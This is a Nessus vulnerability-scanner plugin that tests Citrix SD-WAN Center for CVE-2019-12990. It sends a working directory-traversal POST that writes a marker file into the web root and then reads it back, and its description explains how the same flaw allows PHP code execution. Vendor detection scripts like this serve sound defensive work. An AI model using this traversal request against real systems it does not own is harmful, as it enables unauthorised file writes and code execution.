#TRUSTED 86e9323ac381ea785484a7e4a258db6477151822752d3ab97277f6fe564b9ccceac5aa290c474d29d5d680c099a03de0cdd462705e656658ce1c6cb1cfb3da4033add572000191c455e53d7f51febddc1bbc9cbb31003ac2252e510acdfe5e7557e15e628cf0470d79cea44c58f968cc001ff1e6c15a5f82234ee1be0b3754151caea8444ba42c3066eff5dcd009889ba20d29c2b5dde5dd77c16317d8c0d38ba6653ee56dc1cc66a5fac12bbda8c66c05a1617d0fcfb594b4df3ce0da7f46381880a52d8f83afb44ef08010c3cc0bcea64a96eb43466e1cebf3571fa66fcc1e5dc1a4acc659082e104df1edcabd47d27ceea84d4056dcc4e2540765d62e744d600a4299372f2636e1a8c62bd54e9e55a4be30cd19a39f07f7ac5adb3886e727fe4ae3bf6f2ea84ea8b1f551055c5d399f544a0e150b59b22e9c516bed13c2e6f0b94bf164e862fe64d6494920e0f6d0027acd3912272c272f8b01eea72c8149df735dc42edbb19b534fe37a934764a9b6c596b777eb078a16ef83cae99b6efe24f14f4c65813829776c092b14f1bfbea8357f26a7ce35baccc45a1a5cb5a6848fb64ddcc51684e3cb49d8e23e3b0967073ed906c641bee61f30704715ea85b2d983e5c791a49582ef6659c89aa48dd2854ab3576477b192f1dcc14341c1571e0e7831c1d00bf6474feb483e170228c7c783e121dd17f616b73254338be68cac
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(132102);
  script_version("1.4");
  script_cvs_date("Date: 2019/12/19");

  script_cve_id("CVE-2019-12990");
  script_bugtraq_id(109133);
  script_xref(name:"TRA", value:"TRA-2019-31");

  script_name(english:"Citrix and NetScaler SD-WAN Center Unauthenticated Directory Traversal File Write");
  script_summary(english:"Attempts to upload a file visible on the web root of the remote host.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is susceptible to directory traversal with write capability by a remote, unauthenticated attacker.");
  script_set_attribute(attribute:"description", value:
"The remote Citrix SD-WAN Center or NetScaler SD-WAN Center is susceptible to directory traversal and file writes in
arbitrary locations. This is due to improper sanitization of user-supplied input in the applianceSettingsFileTransfer
action of ApplianceSettingsController. An unauthenticated, remote attacker can exploit this by routing traffic through
the Collector controller and supplying crafted values for 'filename', 'filedata', and 'workspace_id'. This allows
writing files to locations writable by the 'www-data' user, as well as writing crafted PHP files to
/home/talariuser/www/app/webroot/files/ to execute arbitrary PHP code.");
  script_set_attribute(attribute:"see_also", value:"https://support.citrix.com/article/CTX251987");
  # https://www.tenable.com/blog/multiple-vulnerabilities-found-in-citrix-sd-wan-center-and-sd-wan-appliances
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a1b1f9a7");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Citrix SD-WAN Center version 10.2.3 or later or NetScaler SD-WAN Center version 10.0.8 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2019-12990");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2019/07/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/06/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/12/18");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:citrix:sd-wan-center");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("citrix_sdwan_center_detect.nbin");
  script_require_keys("installed_sw/Citrix SD-WAN Center");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include('audit.inc');
include('global_settings.inc');
include('install_func.inc');
include('http.inc');
include('spad_log_func.inc');


#
# Main
#

app_name = 'Citrix SD-WAN Center';
# Exit if app is not detected on the target host
get_install_count(app_name:app_name, exit_if_zero:TRUE);
port = get_http_port(default:443);

# Exit if app is not detected on this port
get_single_install(
  app_name : app_name,
  port     : port
);

# Generate a random pattern for the payload to prove the vulnerability
pattern = rand_str(length:8, charset:'0123456789ABCDEF');
spad_log(message:'The pattern for exploit identification is: ' + pattern);
# The parameters for a directory traversal and file upload 
dir_traversal = 'filename=../../../../../../home/talariuser/www/app/webroot/files/nessusdata.txt&filedata=' + pattern;

http_send_recv3(
    method        : 'POST',
    item          : '/Collector/appliancesettings/applianceSettingsFileTransfer',
    port          : port,
    content_type  : 'application/x-www-form-urlencoded',
    data          : dir_traversal
);

upload_request = http_last_sent_request();
spad_log(message:'Attempted to write a file with the following request:\n\n' +
    upload_request);

get_response = http_send_recv3(
    method        : 'GET',
    item          : '/talari/app/files/nessusdata.txt',
    port          : port
);

get_request = http_last_sent_request();

spad_log(message:'Attempted to get the previously written file with the following request:\n\n' +
    get_request);

if (!empty_or_null(get_response[2]))
  spad_log(message:'Received data: ' + get_response[2]);

# If the response is empty or the pattern is not detected, audit as not vulnerable
if (empty_or_null(get_response[2]) || pattern >!< get_response[2])
  audit(AUDIT_LISTEN_NOT_VULN, app_name, port);

# Otherwise, the file upload succeeded so report it as vulnerable
security_report_v4(
  port: port,
  severity: SECURITY_HOLE,
  generic: TRUE,
  request: make_list(upload_request),
  rep_extra: '\nAfter this, Nessus requested and received the uploaded file, nessusdata.txt, using the following request:\n\n' + join(get_request)
);
